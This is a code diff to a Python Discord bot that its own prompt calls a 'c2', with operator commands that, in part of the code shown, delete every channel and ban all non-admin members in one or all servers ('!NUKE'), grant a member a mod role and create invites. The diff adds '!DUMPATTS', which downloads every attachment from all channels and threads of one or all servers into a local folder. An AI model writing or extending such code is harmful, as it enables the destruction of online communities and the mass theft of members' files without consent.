@@ -1,5 +1,6 @@
 import discord
 import asyncio
+import os
 
 intents = discord.Intents.default()
 intents.messages = True
@@ -173,7 +174,7 @@ async def escalatemod(guild_id, identifier):
 async def nuke(*args):
     if '--all' in args:
         for guild in client.guilds:
-            await nuke_server(guild)
+            await nukserv(guild)
         print("nuked all servers.")
     else:
         guild_id = args[0]
@@ -181,10 +182,10 @@ async def nuke(*args):
         if not guild:
             print(f"no server found with ID: {guild_id}")
             return
-        await nuke_server(guild)
+        await nukserv(guild)
         print(f"nuked server {guild.name}.")
 
-async def nuke_server(guild):
+async def nukserv(guild):
     for channel in guild.channels:
         try:
             await channel.delete()
@@ -196,9 +197,48 @@ async def nuke_server(guild):
         if guild.owner_id != member.id and not member.guild_permissions.administrator:
             try:
                 await guild.ban(member)
-                print(f"Banned member: {member.name}#{member.discriminator}")
+                print(f"banned member: {member.name}#{member.discriminator}")
             except Exception as e:
                 print(f"couldn't ban member {member.name}#{member.discriminator}: {e}")
+
+if not os.path.exists('dumps'):
+    os.mkdir('dumps')
+
+async def dumpatts(*args):
+    if '--all' in args:
+        for guild in client.guilds:
+            await dumpguild(guild)
+        print("dump.")
+    else:
+        guild_id = args[0]
+        guild = discord.utils.get(client.guilds, id=int(guild_id))
+        if not guild:
+            print(f"no server found with ID: {guild_id}")
+            return
+        await dumpguild(guild)
+        print(f"dumpted all attachments from server {guild.name}.")
+
+async def dumpguild(guild):
+    for channel in guild.text_channels:
+        await dumpchan(channel)
+    for thread in guild.threads:
+        await dumpchan(thread)
+
+async def dumpchan(channel):
+    try:
+        async for message in channel.history(limit=None):
+            for attachment in message.attachments:
+                await download_attachment(attachment)
+    except Exception as e:
+        print(f"could not dump attachments from {channel.name}: {e}")
+
+async def download_attachment(attachment):
+    file_path = os.path.join('dumps', attachment.filename)
+    try:
+        await attachment.save(file_path)
+        print(f"downloaded {attachment.filename}")
+    except Exception as e:
+        print(f"fauled to download {attachment.filename}: {e}")
 
 async def usage(command=None):
     usage_info = {
@@ -209,6 +249,7 @@ async def usage(command=None):
         '!INV': '!INV <server_id> - creates an invite link for a specific server.',
         '!MOD': '!MOD <server_id> <member_id|member_name> - grants the "mod" role to a specified member.',
         '!LEAVE': '!LEAVE - makes the bot leave all servers it is in.',
+        '!DUMPATTS': '!DUMPATTS - Dumps all attachments into a dumps folder of a specified server or all servers if --all is used.',
         '!USAGE': '!USAGE [command] - displays usage information for all commands or a specific command if specified.',
     }
     if command:
@@ -229,6 +270,7 @@ async def loop():
         '!MOD': escalatemod,
         '!NUKE': nuke,
         '!USAGE': usage,
+        '!DUMPATTS': dumpatts
     }
 
     while True:
@@ -244,7 +286,7 @@ async def loop():
             args = parts[1:]
             await commands[cmd](*args)
         else:
-            print("unrecognized command. Use !USAGE for help.")
+            print("unrecognized command, use !USAGE for help.")
 
 async def main():
     token = input("enter c2 token: ")
